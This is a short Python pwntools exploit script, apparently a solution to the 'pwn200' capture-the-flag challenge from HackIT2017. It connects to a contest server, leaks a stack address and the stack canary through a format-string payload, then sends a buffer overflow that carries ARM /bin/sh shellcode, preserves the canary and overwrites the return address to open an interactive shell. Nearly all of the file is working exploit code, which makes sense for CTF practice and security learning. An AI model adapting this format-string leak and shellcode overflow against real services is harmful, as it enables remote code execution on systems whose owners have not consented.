## exploit_pwn200.py, by Sudoite
## For HackIT2017

from pwn import *
import struct

p = process('nc 165.227.98.55 3333', shell=True)

pck = lambda x: struct.pack('I', x)

p.recvuntil("CHECK> ")
p.send("%3$p.%517$p\n")

stack_addr = p.recvuntil(".")
stack_addr = stack_addr[:len(stack_addr)-1] # strip trailing period
log.info("stack_addr = " + stack_addr)
canary = p.recvuntil("I need your clothes, your boots and your motorcycle.")
canary = canary[:len(canary) - len("I need your clothes, your boots and your motorcycle.")]
log.info("canary = " + canary)
canary_int = int(canary[2:],16)

start_of_fight_buffer = int(stack_addr[2:],16) + 0x400
log.info("start of fight buffer = " + hex(start_of_fight_buffer))
p.recvuntil("FIGHT> ")

'''
# My own shellcode attempt
shellcode1 = '\x01\x10\xa0\xe3\x02\x40\x2d\xe9\x01\x40\xbd\xe8' 
shellcode2 = '\x0d\x10\xa0\xe1'
shellcode3 = '\x02\x20\xa0\xe3'
shellcode4 = '\x07\x30\xa0\xe1' # mov r3, r7
shellcode5 = '\x08\x70\x87\xe2\x01\x70\x87\xe2\x01\x70\x87\xe2\x01\x70\x87\xe2'
shellcode6 = '\x01\x60\x8f\xe2\x16\xff\x2f\xe1'
shellcode7 = '\xdf\x01' # svc 1
'''

#http://shell-storm.org/shellcode/files/shellcode-904.php
borgeaud_shell = '\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68'
p.send(borgeaud_shell + "A"*990 + pck(canary_int) + "BBBBCCCCDDDD" + pck(start_of_fight_buffer)+"\n")

p.interactive()
